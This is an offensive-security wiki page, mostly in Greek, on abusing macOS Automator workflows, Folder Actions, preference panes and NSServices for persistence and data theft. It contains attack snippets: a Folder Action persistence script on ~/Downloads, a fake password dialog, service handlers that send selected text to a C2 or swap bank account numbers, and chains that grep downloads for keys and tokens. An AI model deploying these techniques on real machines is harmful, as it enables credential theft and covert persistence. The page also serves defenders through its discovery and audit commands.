# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** είναι το οπτικό εργαλείο αυτοματοποίησης του macOS. Εκτελεί **workflows** (`.workflow` bundles) που αποτελούνται από **actions** (`.action` bundles). Το Automator επίσης υποστηρίζει το integration των **Folder Actions**, **Quick Actions** και **Shortcuts**. Στα σύγχρονα macOS, τα workflows μπορούν επίσης να **imported into Shortcuts**, έτσι ώστε η ίδια κακόβουλη λογική να μπορεί να εμφανιστεί ως Finder Quick Action, user service στο `~/Library/Services/`, ή shortcut που βασίζεται σε legacy Automator actions.

Τα Automator actions είναι **plugins** που φορτώνονται στο Automator runtime όταν εκτελείται ένα workflow. Μπορούν να:
- Εκτελούν αυθαίρετα shell scripts
- Επεξεργάζονται αρχεία και δεδομένα
- Αλληλεπιδρούν με εφαρμογές μέσω AppleScript
- Συνδυάζονται για σύνθετη αυτοματοποίηση

### Why This Matters

> [!WARNING]
> Τα Automator workflows μπορούν να **social-engineered** ώστε να εκτελεστούν — εμφανίζονται ως απλά αρχεία εγγράφων. Ένα `.workflow` bundle μπορεί να περιέχει ενσωματωμένες shell commands που εκτελούνται όταν τρέχει το workflow. Σε συνδυασμό με Folder Actions, παρέχουν **automatic persistence** που ενεργοποιείται με file events. Τα πρόσφατα Gatekeeper fixes έδειξαν επίσης ότι τα **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) πρέπει να αντιμετωπίζονται ως εκτελέσιμο περιεχόμενο, όχι ως αβλαβή δεδομένα.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Επίθεση: Social-Engineered Workflow

Ένα `.workflow` bundle μοιάζει με ένα κανονικό αρχείο εγγράφου για τους περισσότερους χρήστες:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Επίθεση: Persistence μέσω Folder Action

Τα Folder Actions εκτελούν αυτόματα ένα workflow όταν προστίθενται αρχεία σε έναν παρακολουθούμενο φάκελο:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Τα Folder Actions επιμένουν μετά από επανεκκινήσεις και εκτελούνται σιωπηλά. Ένα Folder Action στο `~/Downloads` σημαίνει ότι **κάθε αρχείο που κατεβάζεται ενεργοποιεί το payload σου** — συμπεριλαμβανομένων αρχείων από Safari, Chrome, AirDrop και συνημμένων email. Σημείωσε επίσης ότι το `System Events` μπορεί να καταχωρήσει Folder Actions που δείχνουν σε scripts εκτός των προεπιλεγμένων τοποθεσιών `~/Library/Scripts/Folder Action Scripts`, κάτι που κάνει το loose-path hunting να αξίζει. Για σχετικές επιπτώσεις TCC, δες [τη σελίδα TCC](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basic Information

Τα preference panes (`.prefPane` bundles) είναι plugins που φορτώνονται από τα **System Settings** (πρώην System Preferences). Παρέχουν panels UI ρύθμισης για λειτουργίες του συστήματος ή τρίτων. Σε παλαιότερα συστήματα φορτώνονταν απευθείας από το `System Preferences`; σε νεότερες εκδόσεις τα third-party panes συνήθως δρομολογούνται μέσω μιας **legacy loader XPC service** που ξεκινά από τα System Settings.

### Why This Matters

- Τα preference panes εκτελούνται σε ένα **trusted host process** που δημιουργείται από τα System Settings / System Preferences
- Σε σύγχρονα συστήματα αυτό το host μπορεί να είναι μια **`legacyLoader` XPC service**, άρα το σημαντικό όριο παραμένει **trusted Apple UI process -> third-party code loading**
- Τα third-party preference panes κληρονομούν το **host process security context** και την εμπιστοσύνη του χρήστη που συνδέεται με αυτό το UI
- Οι χρήστες εγκαθιστούν preference panes με **double-clicking** — εύκολο social engineering
- Μόλις εγκατασταθούν, **persist** και φορτώνονται κάθε φορά που τα System Settings ανοίγουν σε εκείνο το panel

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Επίθεση: Hijacking Προνομιακού Context

Ένα κακόβουλο preference pane κληρονομεί το security context του **pane host** (ιστορικά το `System Preferences`, σε νεότερες εκδόσεις συχνά ένα `legacyLoader` helper που εκκινείται από το `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Επίθεση: Persistence μέσω εγκατάστασης
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Επίθεση: UI Phishing

Ένα preference pane μπορεί να μιμηθεί νόμιμα system UI panels για να **phish για credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Βασικές Πληροφορίες

**NSServices** επιτρέπουν σε εφαρμογές να παρέχουν λειτουργικότητα σε άλλες εφαρμογές μέσω του **Services menu** (δεξί κλικ → Services). Όταν ένας χρήστης επιλέγει κείμενο ή δεδομένα και καλεί μια service, τα επιλεγμένα δεδομένα **στέλνονται στον service provider** για επεξεργασία.

Οι services δηλώνονται σε ένα application's `Info.plist` κάτω από το κλειδί `NSServices` και καταχωρούνται με τον pasteboard server (`pbs`). Το macOS επίσης διατηρεί ένα **service cache** και μια **restriction policy** που αποφασίζουν ποια services είναι ορατά και αν οι sandboxed callers πρέπει να λάβουν μια επιπλέον προειδοποίηση.

### Γιατί Αυτό Έχει Σημασία

- Οι services δέχονται **cross-application data flow** — επιλεγμένο κείμενο από οποιαδήποτε εφαρμογή στέλνεται στο service
- Ένα malicious service συλλέγει δεδομένα από password managers, email clients, financial apps
- Οι services μπορούν να **επιστρέψουν τροποποιημένα δεδομένα** στην εφαρμογή που καλεί (man-in-the-middle σε selection operations)
- Τα service names μπορούν να διαμορφωθούν ώστε να φαίνονται legitimate ("Format Text", "Encrypt Selection", "Share")
- Το προαιρετικό `NSRestricted` flag είναι security-relevant: ένα service που έχει επισημανθεί ως unrestricted μπορεί να κληθεί από ένα sandboxed app χωρίς την προειδοποίηση που δείχνει το macOS για escape-prone services

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Επίθεση: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Επίθεση: Data Modification (Man-in-the-Middle)

Μια υπηρεσία μπορεί να **τροποποιήσει τα δεδομένα που επιστρέφονται** ενώ φαίνεται να παρέχει μια νόμιμη λειτουργία:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Περιορισμένες Υπηρεσίες & Σύγχρονη Κατάχρηση

Η Apple υποστηρίζει ένα προαιρετικό `NSRestricted` boolean ανά ορισμό υπηρεσίας. Αν έχει οριστεί, το macOS προειδοποιεί sandboxed callers επειδή η υπηρεσία μπορεί να τους βοηθήσει να **escape sandbox or privacy boundaries**. Από επιθετική σκοπιά, αυτό δίνει δύο χρήσιμες διαδρομές ελέγχου:

- Αναζήτησε **third-party services not marked as restricted** ακόμη κι αν κάνουν proxy Apple Events, file access, ή άλλες privileged actions
- Αναζήτησε **high-value built-in services** με ισχυρά entitlements (για παράδειγμα, υπηρεσίες που εκτίθενται από Script Editor ή Finder-backed helpers) και έλεγξε αν το user interaction αρκεί για να τις μετατρέψει σε data-access primitive

Ένα καλό πρόσφατο παράδειγμα είναι το **CVE-2022-48574**, όπου ο μηχανισμός Services μπορούσε να καταχραστεί για πρόσβαση σε **TCC-protected user files χωρίς το αναμενόμενο confirmation flow**. Το bug έχει διορθωθεί, αλλά η τεχνική παραμένει χρήσιμη για threat modeling: κάθε service που προωθεί file access ή automation requests εκ μέρους του caller αξίζει την ίδια προσοχή.

---

## Πρόσφατες Σημειώσεις Ασφαλείας

- **Τα Quick Actions είναι executable content**: Η Apple διόρθωσε ένα Gatekeeper bypass το 2024 όπου ένα app-bundled Automator Quick Action μπορούσε να εκτελεστεί χωρίς τη συνήθη αξιολόγηση. Όταν κάνεις auditing apps, εξέτασε το `Contents/PlugIns/*.workflow/Contents/document.wflow` ακριβώς όπως θα εξέταζες helper scripts ή login items. Δες [τη σελίδα Gatekeeper](../macos-security-protections/macos-gatekeeper.md).
- **Τα Shortcuts μπορούν να κληρονομήσουν legacy Automator behavior**: Η Apple πρόσθεσε επίσης ένα επιπλέον user-consent prompt αφού βρέθηκαν third-party shortcuts που χρησιμοποιούσαν ένα **legacy Automator action** για να στείλουν Apple Events χωρίς το αναμενόμενο permission flow. Τα imported workflows και τα shortcut bundles θα πρέπει να ελέγχονται για `Run AppleScript`, `Run Shell Script`, και παρόμοια bridge actions. Δες [τη σελίδα TCC](../macos-security-protections/macos-tcc/README.md).
- **Το Automator παραμένει ενεργό privacy boundary**: Η Apple διόρθωσε άλλο ένα Automator bug το 2025 για πρόσβαση σε protected user data. Ακόμη κι αν το Automator είναι legacy surface, αντιμετώπισε κάθε workflow runner, Quick Action host, ή automation bridge ως current attack surface και όχι ως dead code.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC Κλιμάκωση
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Κλοπή Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Αναφορές

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
